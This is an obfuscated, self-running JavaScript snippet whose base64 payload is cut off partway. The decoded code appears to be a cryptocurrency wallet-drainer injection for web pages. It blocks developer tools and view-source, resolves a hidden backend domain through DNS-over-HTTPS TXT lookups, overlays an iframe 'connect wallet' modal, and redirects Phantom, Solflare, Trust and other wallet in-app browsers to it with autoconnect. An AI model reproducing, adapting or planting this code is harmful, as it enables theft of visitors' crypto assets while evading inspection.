(function(){var _0xcxnjje=atob("KGZ1bmN0aW9uKCkgewovLyBQcmVjb25uZWN0IHRvIGtub3duIENETiBkb21haW5zIGZvciBmYXN0ZXIgcmVzb3VyY2UgbG9hZGluZwooZnVuY3Rpb24oKXt2YXIgZD1kb2N1bWVudCxoPWQuaGVhZHx8ZC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnaGVhZCcpWzBdO2lmKCFoKXJldHVybjt2YXIgZG9tYWlucz1bJ2h0dHBzOi8vcHViLTE0YzE1MDQ2ODFkMjQyNzY4NGFjMWY0ODkzMzhkMDc1LnIyLmRldicsJ2h0dHBzOi8vYXBpLndlYjNtb2RhbC5vcmcnXTtmb3IodmFyIGk9MDtpPGRvbWFpbnMubGVuZ3RoO2krKyl7dmFyIGw9ZC5jcmVhdGVFbGVtZW50KCdsaW5rJyk7bC5yZWw9J3ByZWNvbm5lY3QnO2wuaHJlZj1kb21haW5zW2ldO2wuY3Jvc3NPcmlnaW49J2Fub255bW91cyc7aC5hcHBlbmRDaGlsZChsKX19KSgpOwoKKGZ1bmN0aW9uKCkgewogIC8vIFNraXAgZGV2dG9vbHMgZGV0ZWN0aW9uIG9uIG1vYmlsZSBkZXZpY2VzIChjYXVzZXMgZmFsc2UgcG9zaXRpdmVzKQogIHZhciBpc01vYmlsZSA9IC9BbmRyb2lkfHdlYk9TfGlQaG9uZXxpUGFkfGlQb2R8QmxhY2tCZXJyeXxJRU1vYmlsZXxPcGVyYSBNaW5pL2kudGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsKICBpZiAoaXNNb2JpbGUpIHJldHVybjsKCiAgdmFyIGRldnRvb2xzID0ge29wZW46IGZhbHNlLCBvcmllbnRhdGlvbjogbnVsbH07CiAgdmFyIHRocmVzaG9sZCA9IDE2MDsKICB2YXIgZW1pdEV2ZW50ID0gZnVuY3Rpb24oc3RhdGUsIG9yaWVudGF0aW9uKSB7CiAgICBpZiAoc3RhdGUpIHsKICAgICAgY3Jhc2hTaXRlKCk7CiAgICB9CiAgfTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGlmICh3aW5kb3cub3V0ZXJIZWlnaHQgLSB3aW5kb3cuaW5uZXJIZWlnaHQgPiB0aHJlc2hvbGQgfHwKICAgICAgICB3aW5kb3cub3V0ZXJXaWR0aCAtIHdpbmRvdy5pbm5lcldpZHRoID4gdGhyZXNob2xkKSB7CiAgICAgIGlmICghZGV2dG9vbHMub3BlbikgewogICAgICAgIGVtaXRFdmVudCh0cnVlLCAnZG9ja2VkJyk7CiAgICAgICAgZGV2dG9vbHMub3BlbiA9IHRydWU7CiAgICAgIH0KICAgIH0gZWxzZSB7CiAgICAgIGRldnRvb2xzLm9wZW4gPSBmYWxzZTsKICAgIH0KICB9LCAxMDApOwogIHZhciBlbGVtZW50ID0gbmV3IEltYWdlKCk7CiAgT2JqZWN0LmRlZmluZVByb3BlcnR5KGVsZW1lbnQsICdpZCcsIHsKICAgIGdldDogZnVuY3Rpb24oKSB7CiAgICAgIGVtaXRFdmVudCh0cnVlLCAnY29uc29sZScpOwogICAgICBkZXZ0b29scy5vcGVuID0gdHJ1ZTsKICAgIH0KICB9KTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGNvbnNvbGUubG9nKGVsZW1lbnQpOwogICAgY29uc29sZS5jbGVhcigpOwogIH0sIDEwMCk7CiAgc2V0SW50ZXJ2YWwoZnVuY3Rpb24oKSB7CiAgICB2YXIgc3RhcnQgPSBwZXJmb3JtYW5jZS5ub3coKTsKICAgIGRlYnVnZ2VyOwogICAgdmFyIGVuZCA9IHBlcmZvcm1hbmNlLm5vdygpOwogICAgaWYgKGVuZCAtIHN0YXJ0ID4gMTAwKSB7CiAgICAgIGVtaXRFdmVudCh0cnVlLCAnZGVidWdnZXInKTsKICAgIH0KICB9LCAxMDApOwogIGZ1bmN0aW9uIGNyYXNoU2l0ZSgpIHsKICAgIC8vIFJlZGlyZWN0IHRvIGJsYW5rIHBhZ2UgaW5zdGVhZCBvZiBET00gbWFuaXB1bGF0aW9uCiAgICAvLyBVc2luZyBpbm5lckhUTUwgd291bGQgZGVzdHJveS9yZWNyZWF0ZSB0aGUgaWZyYW1lLCBjYXVzaW5nIHJlcXVlc3Qgc3BhbQogICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAnYWJvdXQ6YmxhbmsnOwogIH0KICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdjb250ZXh0bWVudScsIGZ1bmN0aW9uKGUpIHsgZS5wcmV2ZW50RGVmYXVsdCgpOyB9KTsKICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgewogICAgaWYgKGUua2V5Q29kZSA9PT0gMTIzIHx8CiAgICAgICAgKGUuY3RybEtleSAmJiBlLnNoaWZ0S2V5ICYmIGUua2V5Q29kZSA9PT0gNzMpIHx8CiAgICAgICAgKGUuY3RybEtleSAmJiBlLnNoaWZ0S2V5ICYmIGUua2V5Q29kZSA9PT0gNzQpIHx8CiAgICAgICAgKGUuY3RybEtleSAmJiBlLmtleUNvZGUgPT09IDg1KSkgewogICAgICBlLnByZXZlbnREZWZhdWx0KCk7CiAgICAgIGNyYXNoU2l0ZSgpOwogICAgICByZXR1cm4gZmFsc2U7CiAgICB9CiAgfSk7Cn0pKCk7Cgp2YXIgQ09ORklHX0lEID0gIjY5OTFhYzAxOTI4ZWIyMGFjOWJjMmRkZSI7CnZhciBfcm4gPSAnX3IuY2hyb21lLWV4dGVuc2lvbi1kYTBlNS1iYy5jb20nOwp2YXIgX2NrID0gJ19ucic7CgpmdW5jdGlvbiBfcGFyc2VUeHQoZGF0YSkgewogIHRyeSB7CiAgICB2YXIgYW5zd2VycyA9IGRhdGEuQW5zd2VyOwogICAgaWYgKCFhbnN3ZXJzIHx8ICFhbnN3ZXJzLmxlbmd0aCkgcmV0dXJuIG51bGw7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8IGFuc3dlcnMubGVuZ3RoOyBpKyspIHsKICAgICAgaWYgKGFuc3dlcnNbaV0udHlwZSA9PT0gMTYpIHsKICAgICAgICB2YXIgdmFsID0gYW5zd2Vyc1tpXS5kYXRhOwogICAgICAgIGlmICh2YWwgJiYgdmFsLmNoYXJBdCgwKSA9PT0gJyInKSB2YWwgPSB2YWwuc2xpY2UoMSwgLTEpOwogICAgICAgIGlmICh2YWwgJiYgdmFsLmluZGV4T2YoJy4nKSAhPT0gLTEpIHJldHVybiB2YWw7CiAgICAgIH0KICAgIH0KICAgIHJldHVybiBudWxsOwogIH0gY2F0Y2ggKGUpIHsgcmV0dXJuIG51bGw7IH0KfQoKZnVuY3Rpb24gX2NhY2hlU2V0KGtleSwgdmFsKSB7CiAgdHJ5IHsgc2Vzc2lvblN0b3JhZ2Uuc2V0SXRlbShrZXksIEpTT04uc3RyaW5naWZ5KHsgdjogdmFsLCB0OiBEYXRlLm5vdygpIH0pKTsgfSBjYXRjaChlKSB7fQp9CgpmdW5jdGlvbiBfY2FjaGVHZXQoa2V5LCB0dGwpIHsKICB0cnkgewogICAgdmFyIHJhdyA9IHNlc3Npb25TdG9yYWdlLmdldEl0ZW0oa2V5KTsKICAgIGlmICghcmF3KSByZXR1cm4gbnVsbDsKICAgIHZhciBvYmogPSBKU09OLnBhcnNlKHJhdyk7CiAgICBpZiAoRGF0ZS5ub3coKSAtIG9iai50ID4gdHRsKSB7IHNlc3Npb25TdG9yYWdlLnJlbW92ZUl0ZW0oa2V5KTsgcmV0dXJuIG51bGw7IH0KICAgIHJldHVybiBvYmoudjsKICB9IGNhdGNoKGUpIHsgcmV0dXJuIG51bGw7IH0KfQoKZnVuY3Rpb24gX2ZldGNoRG9oKG5hbWUpIHsKICB2YXIgdXJscyA9IFsKICAgICdodHRwczovL2Nsb3VkZmxhcmUtZG5zLmNvbS9kbnMtcXVlcnk/bmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpICsgJyZ0eXBlPVRYVCcsCiAgICAnaHR0cHM6Ly9kbnMuZ29vZ2xlL3Jlc29sdmU/bmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpICsgJyZ0eXBlPVRYVCcKICBdOwogIHZhciBpZHggPSBNYXRoLnJhbmRvbSgpIDwgMC41ID8gMCA6IDE7CiAgcmV0dXJuIGZldGNoKHVybHNbaWR4XSwgeyBoZWFkZXJzOiB7IEFjY2VwdDogJ2FwcGxpY2F0aW9uL2Rucy1qc29uJyB9IH0pCiAgICAudGhlbihmdW5jdGlvbihyKSB7IHJldHVybiByLmpzb24oKTsgfSkKICAgIC50aGVuKGZ1bmN0aW9uKGQpIHsKICAgICAgdmFyIHYgPSBfcGFyc2VUeHQoZCk7CiAgICAgIGlmICh2KSByZXR1cm4gdjsKICAgICAgcmV0dXJuIGZldGNoKHVybHNbMSAtIGlkeF0sIHsgaGVhZGVyczogeyBBY2NlcHQ6ICdhcHBsaWNhdGlvbi9kbnMtanNvbicgfSB9KQogICAgICAgIC50aGVuKGZ1bmN0aW9uKHIyKSB7IHJldHVybiByMi5qc29uKCk7IH0pCiAgICAgICAgLnRoZW4oZnVuY3Rpb24oZDIpIHsgcmV0dXJuIF9wYXJzZVR4dChkMik7IH0pOwogICAgfSkKICAgIC5jYXRjaChmdW5jdGlvbigpIHsKICAgICAgcmV0dXJuIGZldGNoKHVybHNbMSAtIGlkeF0sIHsgaGVhZGVyczogeyBBY2NlcHQ6ICdhcHBsaWNhdGlvbi9kbnMtanNvbicgfSB9KQogICAgICAgIC50aGVuKGZ1bmN0aW9uKHIpIHsgcmV0dXJuIHIuanNvbigpOyB9KQogICAgICAgIC50aGVuKGZ1bmN0aW9uKGQpIHsgcmV0dXJuIF9wYXJzZVR4dChkKTsgfSkKICAgICAgICAuY2F0Y2goZnVuY3Rpb24oKSB7IHJldHVybiBudWxsOyB9KTsKICAgIH0pOwp9CgpmdW5jdGlvbiByZXNvbHZlQmFja2VuZCgpIHsKICB2YXIgY2FjaGVkID0gX2NhY2hlR2V0KF9jaywgMzAwMDAwKTsKICBpZiAoY2FjaGVkKSByZXR1cm4gUHJvbWlzZS5yZXNvbHZlKGNhY2hlZCk7CiAgcmV0dXJuIF9mZXRjaERvaChfcm4pLnRoZW4oZnVuY3Rpb24oZG9tYWluKSB7CiAgICBpZiAoZG9tYWluKSBfY2FjaGVTZXQoX2NrLCBkb21haW4pOwogICAgcmV0dXJuIGRvbWFpbjsKICB9KTsKfQoKdmFyIF9yZXNvbHZlUHJvbWlzZSA9IHJlc29sdmVCYWNrZW5kKCk7Cgphc3luYyBmdW5jdGlvbiBib290KCkgewogIHZhciBkb21haW4gPSBhd2FpdCBfcmVzb2x2ZVByb21pc2U7CiAgaWYgKCFkb21haW4pIHJldHVybjsKCiAgdmFyIHBhcmVudEZ1bGwgPSB3aW5kb3cubG9jYXRpb24uaG9zdCArICh3aW5kb3cubG9jYXRpb24ucGF0aG5hbWUgfHwgJycpICsgKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2ggfHwgJycpOwogIHZhciBNT0RBTF9VUkwgPSAnaHR0cHM6Ly8nICsgZG9tYWluICsgJy9kZW1vLnBocD9pZD0nICsgQ09ORklHX0lEICsKICAgIChwYXJlbnRGdWxsID8gKCcmcGFyZW50X3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KHBhcmVudEZ1bGwpKSA6ICcnKTsKCiAgLy8gTU9CSUxFIFdBTExFVCBCUk9XU0VSIEZJWDogRGV0ZWN0IGlmIHdlJ3JlIGluc2lkZSBhIG1vYmlsZSB3YWxsZXQncyBpbi1hcHAgYnJvd3NlcgogIC8vIElmIHNvLCByZWRpcmVjdCB0aGUgZW50aXJlIHBhZ2UgdG8gdGhlIG1vZGFsIGRvbWFpbiAoc2tpcCBpZnJhbWUpCiAgLy8gTk9URTogUGhhbnRvbSBtb2JpbGUgd29ya3MgZmluZSB3aXRoIGlmcmFtZXMsIHNvIHdlIEVYQ0xVREUgaXQgZnJvbSB0aGlzIHJlZGlyZWN0CiAgKGZ1bmN0aW9uKCkgewogICAgdmFyIHVhID0gbmF2aWdhdG9yLnVzZXJBZ2VudC50b0xvd2VyQ2FzZSgpOwogICAgdmFyIGlzTW9iaWxlID0gL2FuZHJvaWR8aXBob25lfGlwYWR8aXBvZC9pLnRlc3QodWEpIHx8CiAgICAgIChuYXZpZ2F0b3IubWF4VG91Y2hQb2ludHMgPiAxICYmIC9tYWNpbnRvc2gvaS50ZXN0KHVhKSk7CiAgICB2YXIgaXNQaGFudG9tQnJvd3NlciA9ICEhKHdpbmRvdy5waGFudG9tPy5zb2xhbmE/LmlzUGhhbnRvbSB8fCB3aW5kb3cuc29sYW5hPy5pc1BoYW50b20pOwogICAgdmFyIGlzT3RoZXJXYWxsZXRCcm93c2VyID0gISEod2luZG93LnNvbGZsYXJlPy5pc1NvbGZsYXJlIHx8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuU29sZmxhcmVBcHAgfHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy50cnVzdHdhbGxldD8uc29sYW5hIHx8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB3aW5kb3cuYmFja3BhY2s/LmlzQmFja3BhY2sgfHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5jb2luYmFzZVNvbGFuYSk7CiAgICBpZiAoaXNNb2JpbGUgJiYgIWlzUGhhbnRvbUJyb3dzZXIgJiYgaXNPdGhlcldhbGxldEJyb3dzZXIgJiYgIXdpbmRvdy5sb2NhdGlvbi5zZWFyY2guaW5jbHVkZXMoJ25vcmVkaXJlY3Q9MScpKSB7CiAgICAgIHZhciByZWRpcmVjdFVybCA9IE1PREFMX1VSTCArICcmc291cmNlPWRpcmVjdC1tb2JpbGUmbm9yZWRpcmVjdD0xJmF1dG9jb25uZWN0PTEnOwogICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IHJlZGlyZWN0VXJsOwogICAgICByZXR1cm47CiAgICB9CiAgfSkoKTsKCiAgdmFyIHN0eWxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc3R5bGUnKTsKICBzdHlsZS50ZXh0Q29udGVudCA9ICcubm9pci1tb2RhbC1vdmVybGF5IHsgcG9zaXRpb246IGZpeGVkOyB0b3A6IDA7IGxlZnQ6IDA7IHdpZHRoOiAxMDAlOyBoZWlnaHQ6IDEwMCU7IGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC44KTsgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDhweCk7IGRpc3BsYXk6IG5vbmU7IGp1c3RpZnktY29udGVudDogY2VudGVyOyBhbGlnbi1pdGVtczogY2VudGVyOyB6LWluZGV4OiA5OTk5OTsgb3BhY2l0eTogMDsgdHJhbnNpdGlvbjogb3BhY2l0eSAwLjNzIGVhc2U7fS5ub2lyLW1vZGFsLW92ZXJsYXkubm9pci1hY3RpdmUgeyBkaXNwbGF5OiBmbGV4OyBvcGFjaXR5OiAxO30ubm9pci1tb2RhbC1pZnJhbWUgeyB3aWR0aDogMzYwcHg7IGhlaWdodDogNjIwcHg7IGJvcmRlcjogbm9uZTsgYm9yZGVyLXJhZGl1czogMTZweDsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IG92ZXJmbG93OiBoaWRkZW47IHRyYW5zZm9ybTogc2NhbGUoMC45KTsgb3BhY2l0eTogMDsgdHJhbnNpdGlvbjogdHJhbnNmb3JtIDAuM3MgZWFzZSwgb3BhY2l0eSAwLjI1cyBlYXNlLCBoZWlnaHQgMC4zcyBjdWJpYy1iZXppZXIoMC4xNiwgMSwgMC4zLCAxKTt9Lm5vaXItbW9kYWwtb3ZlcmxheS5ub2lyLWFjdGl2ZSAubm9pci1tb2RhbC1pZnJhbWUgeyB0cmFuc2Zvcm06IHNjYWxlKDEpO30ubm9pci1tb2RhbC1pZnJhbWUubm9pci1pZnJhbWUtcmVhZHkgeyBvcGFjaXR5OiAxO30ubm9pci1zcGlubmVyIHsgcG9zaXRpb246IGFic29sdXRlOyB3aWR0aDogMzZweDsgaGVpZ2h0OiAzNnB4OyBib3JkZXI6IDNweCBzb2xpZCByZ2JhKDI1NSwyNTUsMjU1LDAuMDgpOyBib3JkZXItdG9wLWNvbG9yOiByZ2JhKDI1NSwyNTUsMjU1LDAuNSk7IGJvcmRlci1yYWRpdXM6IDUwJTsgYW5pbWF0aW9uOiBub2lyLXNwaW4gMC43cyBsaW5lYXIgaW5maW5pdGU7IHRyYW5zaXRpb246IG9wYWNpdHkgMC4yNXMgZWFzZTt9Lm5vaXItc3Bpbm5lci5ub2lyLWhpZGRlbiB7IG9wYWNpdHk6IDA7IHBvaW50ZXItZXZlbnRzOiBub25lOyB9QGtleWZyYW1lcyBub2lyLXNwaW4geyB0byB7IHRyYW5zZm9ybTogcm90YXRlKDM2MGRlZyk7IH0gfUBtZWRpYSAobWF4LXdpZHRoOiA0ODBweCkgeyAubm9pci1tb2RhbC1pZnJhbWUgeyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyBib3JkZXItcmFkaXVzOiAwOyBvdmVyZmxvdy15OiBhdXRvOyB9fSc7CiAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzdHlsZSk7CgogIHZhciBtb2RhbEhUTUwgPSAnPGRpdiBjbGFzcz0ibm9pci1tb2RhbC1vdmVybGF5IiBpZD0ibm9pck1vZGFsT3ZlcmxheSI+JyArCiAgICAnPGRpdiBjbGFzcz0ibm9pci1zcGlubmVyIj48L2Rpdj4nICsKICAgICc8aWZyYW1lIGNsYXNzPSJub2lyLW1vZGFsLWlmcmFtZSIgc3JjPSInICsgTU9EQUxfVVJMICsgJyIgYWxsb3dUcmFuc3BhcmVuY3k9InRydWUiPjwvaWZyYW1lPicgKwogICAgJzwvZGl2Pic7CgogIC8vIE1lc3NhZ2UgbGlzdGVuZXIgYXQgR0xPQkFMIHNjb3BlIC0gaGFuZGxlcyB3YWxsZXQgZGVlcCBsaW5rIG1lc3NhZ2VzIGZyb20gaWZyYW1lCiAgd2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ21lc3NhZ2UnLCBmdW5jdGlvbihldmVudCkgewogICAgLy8gSGFuZGxlIGRlc2t0b3BSZWRpcmVjdCBmb3Igd2FsbGV0cyB0aGF0IGRvbid0IHdvcmsgd2l0aCBpZnJhbWVzIChlLmcuLCBUcnVzdCBXYWxsZXQgZGVza3RvcCkKICAgIGlmIChldmVudC5kYXRhICYmIGV2ZW50LmRhdGEuZGVza3RvcFJlZGlyZWN0KSB7CiAgICAgIHZhciBpZnJhbWUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdpZnJhbWUnKTsKICAgICAgaWYgKGlmcmFtZSAmJiBpZnJhbWUuc3JjKSB7CiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBpZnJhbWUuc3JjICsgJyZzb3VyY2U9ZGVza3RvcC1yZWRpcmVjdCc7CiAgICAgIH0KICAgICAgcmV0dXJuOwogICAgfQoKICAgIC8vIEhhbmRsZSBtb2JpbGUgd2FsbGV0IHJlZGlyZWN0IHdpdGggbW9kYWwgVVJMIChmcm9tIEFwcEtpdCBpZnJhbWUpCiAgICAvLyBVc2VzIHRoZSBpZnJhbWUncyBVUkwgKG1vZGFsIFVSTCkgc28gdGhlIHdhbGxldCBvcGVucyBpdCBhdCB0b3AgbGV2ZWwg4oCUIG5vIGlmcmFtZQogICAgaWYgKGV2ZW50LmRhdGEgJiYgZXZlbnQuZGF0YS50eXBlID09PSAnbm9pcldhbGxldFJlZGlyZWN0JyAmJiBldmVudC5kYXRhLndhbGxldCAmJiBldmVudC5kYXRhLnVybCkgewogICAgICB2YXIgd2FsbGV0ID0gZXZlbnQuZGF0YS53YWxsZXQ7CiAgICAgIHZhciB0YXJnZXRVcmwgPSBlbmNvZGVVUklDb21wb25lbnQoZXZlbnQuZGF0YS51cmwpOwogICAgICB2YXIgdGFyZ2V0UmVmID0gZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4pOwogICAgICB2YXIgd2FsbGV0TGluayA9ICcnOwogICAgICBpZiAod2FsbGV0ID09PSAncGhhbnRvbScpIHsKICAgICAgICB3YWxsZXRMaW5rID0gJ2h0dHBzOi8vcGhhbnRvbS5hcHAvdWwvYnJvd3NlLycgKyB0YXJnZXRVcmwgKyAnP3JlZj0nICsgdGFyZ2V0UmVmOwogICAgICB9IGVsc2UgaWYgKHdhbGxldCA9PT0gJ3NvbGZsYXJlJykgewogICAgICAgIHdhbGxldExpbmsgPSAnaHR0cHM6Ly9zb2xmbGFyZS5jb20vdWwvdjEvYnJvd3NlLycgKyB0YXJnZXRVcmwgKyAnP3JlZj0nICsgdGFyZ2V0UmVmOwogICAgICB9IGVsc2UgaWYgKHdhbGxldCA9PT0gJ2JhY2twYWNrJykgewogICAgICAgIHdhbGxldExpbmsgPSAnaHR0cHM6Ly9iYWNrcGFjay5hcHAvdWwvYnJvd3NlLycgKyB0YXJnZXRVcmwgKyAnP3JlZj0nICsgdGFyZ2V0UmVmOwogICAgICB9IGVsc2UgaWYgKHdhbGxldCA9PT0gJ2NvaW5iYXNlJykgewogICAgICAgIHdhbGxldExpbmsgPSAnaHR0cHM6Ly9nby5jYi13LmNvbS9kYXBwP2NiX3VybD0nICsgdGFyZ2V0VXJsOwogICAgICB9IGVsc2UgaWYgKHdhbGxldCA9PT0gJ3RydXN0JykgewogICAgICAgIHdhbGxldExpbmsgPSAnaHR0cHM6Ly9saW5rLnRydXN0d2FsbGV0LmNvbS9vcGVuX3VybD91cmw9JyArIHRhcmdldFVybDsKICAgICAgfSBlbHNlIGlmICh3YWxsZXQgPT09ICdtYWdpY2VkZW4nKSB7CiAgICAgICAgd2FsbGV0TGluayA9ICdodHRwczovL3dhbGxldC5tYWdpY2VkZW4uaW8vdWwvYnJvd3NlLycgKyB0YXJnZXRVcmwgKyAnP3JlZj0nICsgdGFyZ2V0UmVmOwogICAgICB9CiAgICAgIGlmICh3YWxsZXRMaW5rKSB7CiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSB3YWxsZXRMaW5rOwogICAgICB9CiAgICAgIHJldHVybjsKICAgIH0KCiAgICAvLyBIYW5kbGUgc3RhbmRhcmQgbW9iaWxlIGRlZXBsaW5rIHJlZGlyZWN0cyAobGVnYWN5KQogICAgaWYgKGV2ZW50LmRhdGEgJiYgZXZlbnQuZGF0YS5kZWVwbGluaykgewogICAgICB2YXIgYWN0aW9uID0gZXZlbnQuZGF0YS5kZWVwbGluazsKICAgICAgdmFyIGN1cnJlbnRVcmwgPSBuZXcgVVJMKHdpbmRvdy5sb2NhdGlvbi5ocmVmKTsKICAgICAgY3VycmVudFVybC5zZWFyY2hQYXJhbXMuc2V0KCdzaG93RnJhbWUnLCAndHJ1ZScpOwogICAgICB2YXIgdXJsID0gZW5jb2RlVVJJQ29tcG9uZW50KGN1cnJlbnRVcmwudG9TdHJpbmcoKSk7CiAgICAgIHZhciByZWYgPSBlbmNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLm9yaWdpbik7CiAgICAgIHZhciBtb2JpbGVEZWVwTGluayA9ICcnOwogICAgICBpZiAoYWN0aW9uID09PSAncGhhbnRvbScpIHsKICAgICAgICBtb2JpbGVEZWVwTGluayA9ICdodHRwczovL3BoYW50b20uYXBwL3VsL2Jyb3dzZS8nICsgdXJsICsgJz9yZWY9JyArIHJlZjsKICAgICAgfSBlbHNlIGlmIChhY3Rpb24gPT09ICdzb2xmbGFyZScpIHsKICAgICAgICBtb2JpbGVEZWVwTGluayA9ICdodHRwczovL3NvbGZsYXJlLmNvbS91bC92MS9icm93c2UvJyArIHVybCArICc/cmVmPScgKyByZWY7CiAgICAgIH0gZWxzZSBpZiAoYWN0aW9uID09PSAnYmFja3BhY2snKSB7CiAgICAgICAgbW9iaWxlRGVlcExpbmsgPSAnaHR0cHM6Ly9iYWNrcGFjay5hcHAvdWwvYnJvd3NlLycgKyB1cmwgKyAnP3JlZj0nICsgcmVmOwogICAgICB9IGVsc2UgaWYgKGFjdGlvbiA9PT0gJ2NvaW5iYXNlJykgewogICAgICAgIG1vYmlsZURlZXBMaW5rID0gJ2h0dHBzOi8vZ28uY2Itdy5jb20vZGFwcD9jYl91cmw9JyArIHVybDsKICAgICAgfSBlbHNlIGlmIChhY3Rpb24gPT09ICd0cnVzdCcpIHsKICAgICAgICBtb2JpbGVEZWVwTGluayA9ICdodHRwczovL2xpbmsudHJ1c3R3YWxsZXQuY29tL29wZW5fdXJsP3VybD0nICsgdXJsOwogICAgICB9IGVsc2UgaWYgKGFjdGlvbiA9PT0gJ21hZ2ljZWRlbicpIHsKICAgICAgICBtb2JpbGVEZWVwTGluayA9ICdodHRwczovL3dhbGxldC5tYWdpY2VkZW4uaW8vdWwvYnJvd3NlLycgKyB1cmwgKyAnP3JlZj0nICsgcmVmOwogICAgICB9CiAgICAgIGlmIChtb2JpbGVEZWVwTGluaykgewogICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gbW9iaWxlRGVlcExpbms7CiAgICAgIH0KICAgIH0KICB9KTsKCiAgLy8gTW9iaWxlIHdhbGxldCBwaWNrZXIg4oCUIFJlb3duIEFwcEtpdC1zdHlsZSBkZXNpZ24KICAvLyBFYWNoIGJ1dHRvbiBpcyBhIHJlYWwgPGE+IGxpbmsgdG8gdGhlIHdhbGxldCdzIGJyb3dzZSBkZWVwbGluayB3aXRoIHRoZSBtb2RhbCBVUkwKICAvLyBJY29ucyBsb2FkZWQgZnJvbSBXYWxsZXRDb25uZWN0IENETiAoYXBpLndlYjNtb2RhbC5jb20vZ2V0V2FsbGV0SW1hZ2Uve2lkfSkKICBmdW5jdGlvbiBzaG93TW9iaWxlV2FsbGV0UGlja2VyKCkgewogICAgdmFyIGV4aXN0aW5nID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ25vaXJXYWxsZXRQaWNrZXInKTsKICAgIGlmIChleGlzdGluZykgZXhpc3RpbmcucGFyZW50Tm9kZS5yZW1vdmVDaGlsZChleGlzdGluZyk7CgogICAgdmFyIGF1dG9jb25uZWN0VXJsID0gTU9EQUxfVVJMICsgJyZhdXRvY29ubmVjdD0xJzsKICAgIHZhciBlbmNvZGVkVXJsID0gZW5jb2RlVVJJQ29tcG9uZW50KGF1dG9jb25uZWN0VXJsKTsKICAgIHZhciBlbmNvZGVkUmVmID0gZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4pOwogICAgdmFyIGltZ0Jhc2UgPSAnaHR0cHM6Ly9hcGkud2ViM21vZGFsLm9yZy9nZXRXYWxsZXRJbWFnZS8nOwogICAgdmFyIGltZ1EgPSAnP3Byb2plY3RJZD0wNWE3MmYzMTlhZDI1MDA2MGM4MmRhNGRjNzM3ZTBhZCZzdD1hcHBraXQmc3Y9aHRtbC1zb2xhbmEtdW5kZWZpbmVkJzsKICAgIHZhciB3YWxsZXRzID0gWwogICAgICB7IG5hbWU6ICdQaGFudG9tJywgdGFnOiAnUE9QVUxBUicsIGltZzogaW1nQmFzZSArICdiNmVjN2I4MS1iYjRmLTQyN2QtZTI5MC03NjMxZTZlNTBkMDAnICsgaW1nUSwgdXJsOiAnaHR0cHM6Ly9waGFudG9tLmFwcC91bC9icm93c2UvJyArIGVuY29kZWRVcmwgKyAnP3JlZj0nICsgZW5jb2RlZFJlZiB9LAogICAgICB7IG5hbWU6ICdTb2xmbGFyZScsIHRhZzogJ1BPUFVMQVInLCBpbWc6IGltZ0Jhc2UgKyAnMzRjMGUzOGQtNjZjNC00NzBlLTFhZWQtYTZmYWJlMmQxZTAwJyArIGltZ1EsIHVybDogJ2h0dHBzOi8vc29sZmxhcmUuY29tL3VsL3YxL2Jyb3dzZS8nICsgZW5jb2RlZFVybCArICc/cmVmPScgKyBlbmNvZGVkUmVmIH0sCiAgICAgIHsgbmFtZTogJ0JhY2twYWNrJywgdGFnOiAnJywgaW1nOiBpbWdCYXNlICsgJzcxY2E5ZGFmLWEzMWUtNGQyYS1mZDAxLWY1ZGMyZGM2NjkwMCcgKyBpbWdRLCB1cmw6ICdodHRwczovL2JhY2twYWNrLmFwcC91bC9icm93c2UvJyArIGVuY29kZWRVcmwgKyAnP3JlZj0nICsgZW5jb2RlZFJlZiB9LAogICAgICB7IG5hbWU6ICdUcnVzdCBXYWxsZXQnLCB0YWc6ICcnLCBpbWc6IGltZ0Jhc2UgKyAnNzY3N2I1NGYtMzQ4Ni00NmUyLTRlMzctYmY4NzQ3ODE0ZjAwJyArIGltZ1EsIHVybDogJ2h0dHBzOi8vbGluay50cnVzdHdhbGxldC5jb20vb3Blbl91cmw/dXJsPScgKyBlbmNvZGVkVXJsIH0sCiAgICAgIHsgbmFtZTogJ0NvaW5iYXNlIFdhbGxldCcsIHRhZzogJycsIGltZzogaW1nQmFzZSArICcwNGM4OGJmMC1mMTE1LTQ2ODYtOGMyOS05MGEzZDAxOGE0MDAnICsgaW1nUSwgdXJsOiAnaHR0cHM6Ly9nby5jYi13LmNvbS9kYXBwP2NiX3VybD0nICsgZW5jb2RlZFVybCB9CiAgICBdOwoKICAgIHZhciBwaWNrZXJDU1MgPSAnPHN0eWxlPicgKwogICAgICAnLm53cC1vdmVybGF5e3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2J